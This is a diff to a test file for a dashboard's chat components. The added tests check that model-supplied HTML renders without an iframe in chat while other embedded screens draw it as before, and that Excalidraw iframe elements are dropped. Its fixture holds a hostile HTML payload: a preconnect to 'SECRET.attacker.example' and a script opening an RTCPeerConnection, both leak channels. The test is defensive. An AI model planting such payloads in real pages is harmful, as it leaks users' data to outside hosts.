@@ -83,6 +83,8 @@ describe('every frame of supplied HTML holds the app-chat rule', () => {
 const { AppChatContext } = await import('../../dashboard/src/components/sleepy/chat/appChatContext.js');
 const { HtmlView } = await import('../../dashboard/src/components/sleepy/chat/HtmlView.js');
 const { SurveyCard } = await import('../../dashboard/src/components/sleepy/chat/SurveyCard.js');
+const { EmbedProvider } = await import('../../dashboard/src/components/embed/embedMode.js');
+const { withoutHtmlFrames } = await import('../../dashboard/src/lib/excalidraw.js');
 const { QueryClient, QueryClientProvider } = await import('../../dashboard/node_modules/@tanstack/react-query/build/modern/index.js');
 
 const BLOCK = '<link rel="preconnect" href="https://SECRET.attacker.example"><p id="drawn">drawn</p><script>new RTCPeerConnection()</script>';
@@ -144,5 +146,35 @@ describe('the rule in render', () => {
     const out = render(false, h(SurveyCard, { item: ask as never, session: host as never }));
     expect(out).toMatch(/<iframe/);
     expect(out).not.toContain('appChat.previewsOff');
+  });
+});
+
+describe('the key is the chat, not the embed', () => {
+  const grant = (view: string) => ({ tk: 't', view, slug: 's', vault: 'v', member: null, insight: null, theme: null });
+  it('the app window\'s chat screen holds the rule with no provider', () => {
+    const out = renderToStaticMarkup(h(QueryClientProvider, { client: new QueryClient() }, h(EmbedProvider, { value: grant('chat') as never }, h(HtmlView, { html: BLOCK }))));
+    expect(out).toContain('data-model-html-off');
+    expect(out).not.toMatch(/<iframe/);
+  });
+  it('another embedded screen (an insight) is not a chat and draws as before', () => {
+    vi.stubGlobal('document', { documentElement: { getAttribute: () => 'light' } });
+    vi.stubGlobal('getComputedStyle', () => ({ getPropertyValue: () => '' }));
+    try {
+      const out = renderToStaticMarkup(h(QueryClientProvider, { client: new QueryClient() }, h(EmbedProvider, { value: grant('insight') as never }, h(HtmlView, { html: BLOCK }))));
+      expect(out).toMatch(/<iframe/);
+      expect(out).not.toContain('data-model-html-off');
+    } finally { vi.unstubAllGlobals(); }
+  });
+});
+
+describe("Excalidraw's own iframe element never reaches the canvas", () => {
+  it('drops every element of type iframe and keeps the rest', () => {
+    const els = [
+      { id: 'r', type: 'rectangle' },
+      { id: 'f', type: 'iframe', customData: { generationData: { status: 'done', html: BLOCK } } },
+      { id: 'e', type: 'embeddable', link: 'https://www.youtube.com/embed/x' },
+      null,
+    ];
+    expect(withoutHtmlFrames(els).map((e) => (e as { id?: string } | null)?.id ?? null)).toEqual(['r', 'e', null]);
   });
 });
